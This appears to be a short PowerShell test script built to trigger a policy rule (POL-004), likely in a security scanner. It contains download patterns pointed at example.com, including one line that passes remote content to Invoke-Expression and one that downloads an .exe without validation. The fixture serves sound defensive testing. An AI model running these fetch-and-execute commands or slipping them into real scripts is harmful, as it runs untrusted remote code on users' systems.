# Test script with network download operations
# This script should trigger POL-004 policy violation

# Download script from internet
Invoke-WebRequest -Uri "https://example.com/script.ps1" -OutFile "downloaded.ps1"

# Execute downloaded content
$content = Invoke-RestMethod -Uri "https://example.com/api/data"
Invoke-Expression $content

# Download file without validation
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("https://example.com/file.exe", "C:\temp\file.exe")

Write-Host "Download completed"

